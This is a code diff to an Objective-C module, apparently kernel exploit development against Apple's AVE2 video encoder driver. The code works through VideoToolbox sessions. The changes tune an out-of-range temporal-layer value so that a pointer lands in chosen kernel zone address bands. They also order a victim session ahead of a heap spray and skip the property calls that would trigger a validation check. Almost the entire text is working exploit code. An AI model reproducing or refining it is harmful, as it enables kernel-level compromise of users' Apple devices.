@@ -61,7 +61,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
 @implementation KPAuditAVESpriteModule
 
 - (instancetype)initWithSprayCount:(int)count marker:(uint32_t)marker {
-    return [self initWithSprayCount:count marker:marker ntl:16463];
+    return [self initWithSprayCount:count marker:marker ntl:16433];
 }
 
 - (instancetype)initWithSprayCount:(int)count marker:(uint32_t)marker ntl:(int)ntl {
@@ -70,10 +70,10 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         _sprayCount = count;
         _marker = marker;
         _ntl = ntl;
-        _identifier = (ntl == 16463)
+        _identifier = (ntl == 16433)
             ? [NSString stringWithFormat:@"ave112705.sprite%d.armed", count]
             : [NSString stringWithFormat:@"ave112705.sprite%d.ntl%d.armed", count, ntl];
-        _title = (ntl == 16463)
+        _title = (ntl == 16433)
             ? [NSString stringWithFormat:@"AVE2 sprite x%d", count]
             : [NSString stringWithFormat:@"AVE2 sprite x%d (NTL=%d)", count, ntl];
         _subtitle = [NSString stringWithFormat:
@@ -194,24 +194,25 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         int32_t hiSigned = (int32_t)(uint32_t)(liveKPtrs[0] >> 32);
         ntl = 16463 + hiSigned;
     } else if (ntl <= 0) {
-        ntl = 16445; // 0xffffffee00000059
+        ntl = 16433; // 0xffffffe200000059 (.DATA zone)
     }
     uint64_t steeredX0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
 
-    // Include live discovered ZONE_HEAP bands first, then T8122/T8130 pInfo/kheap bands
-    // (0xffffffed..0xffffffef -> NTL 16444..16446) and 0xfffffe10..0xfffffe38.
-    uint64_t x0cands[14];
+    // Include live discovered ZONE_HEAP bands first, then T8122/T8130 Zone map
+    // (.DATA 0xffffffe1..0xffffffe2, .GEN0..3 0xffffffde..0xffffffe1, KMA 0xffffffe4).
+    uint64_t x0cands[16];
     int ncand = 0;
     x0cands[ncand++] = steeredX0;
-    for (int lk = 0; lk < liveKPtrCount && ncand < 14; lk++) {
+    for (int lk = 0; lk < liveKPtrCount && ncand < 16; lk++) {
         uint64_t liveSteered = (liveKPtrs[lk] & 0xffffffff00000000ULL) | 0x59ULL;
         if (liveSteered != steeredX0) x0cands[ncand++] = liveSteered;
     }
     const uint32_t hiBands[] = {
+        0xFFFFFFE2u, 0xFFFFFFE1u, 0xFFFFFFE0u, 0xFFFFFFDFu, 0xFFFFFFDEu, 0xFFFFFFE4u,
         0xFFFFFFEEu, 0xFFFFFFEDu, 0xFFFFFFEFu,
-        0xFFFFFE26u, 0xFFFFFE10u, 0xFFFFFE18u, 0xFFFFFE20u, 0xFFFFFE28u, 0xFFFFFE30u, 0xFFFFFE38u
+        0xFFFFFE26u, 0xFFFFFE10u, 0xFFFFFE20u, 0xFFFFFE30u, 0xFFFFFE33u
     };
-    for (size_t bi = 0; bi < sizeof(hiBands) / sizeof(hiBands[0]) && ncand < 14; bi++) {
+    for (size_t bi = 0; bi < sizeof(hiBands) / sizeof(hiBands[0]) && ncand < 16; bi++) {
         uint64_t cand = ((uint64_t)hiBands[bi] << 32) | 0x59ULL;
         BOOL exists = NO;
         for (int c = 0; c < ncand; c++) {
@@ -231,9 +232,9 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         [report appendFormat:@"  cand[%d] = 0x%016llx\n", c, x0cands[c]];
     }
 
-    // 1) VICTIM session created AND armed BEFORE spray so its AppleAVE2UserClient
-    //    context is allocated ahead of the sibling/OOL/pipe spray, with PropertyMode=1
-    //    + RealTime=NO + NumOfTemporalLayer + PrepareToEncodeFrames committing POST=ntl.
+    // 1) VICTIM session created BEFORE spray; for NTL < 16463 omit PropertyMode=1
+    //    and PrepareToEncodeFrames (which rejects NTL<16463 with -17691 and resets
+    //    POST=1), using raw EncoderUsage=1 + RealTime=NO + NumberOfTemporalLayers.
     VTCompressionSessionRef victim = NULL;
     NSMutableArray *vSink = [NSMutableArray array];
     CFTypeRef retainedVSink = CFRetain((__bridge CFTypeRef)vSink);
@@ -246,10 +247,14 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         [report appendString:@"\nVERDICT: VICTIM_SESSION_FAILED\n"];
         return report;
     }
-    OSStatus pmSt = VTSessionSetProperty(victim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
+    OSStatus pmSt = 0;
     OSStatus uSt = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
     VTSessionSetProperty(victim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
-    OSStatus privNSt = VTSessionSetProperty(victim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(ntl));
+    OSStatus privNSt = 0;
+    if (ntl >= 16463) {
+        pmSt = VTSessionSetProperty(victim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
+        privNSt = VTSessionSetProperty(victim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(ntl));
+    }
     OSStatus nSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));
     int vrbPre = -1, vrbPost = -1;
     CFNumberRef vbn = NULL;
@@ -257,7 +262,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         CFNumberGetValue(vbn, kCFNumberIntType, &vrbPre);
         CFRelease(vbn);
     }
-    OSStatus vPrep = VTCompressionSessionPrepareToEncodeFrames(victim);
+    OSStatus vPrep = (ntl >= 16463) ? VTCompressionSessionPrepareToEncodeFrames(victim) : 0;
     vbn = NULL;
     if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
         CFNumberGetValue(vbn, kCFNumberIntType, &vrbPost);
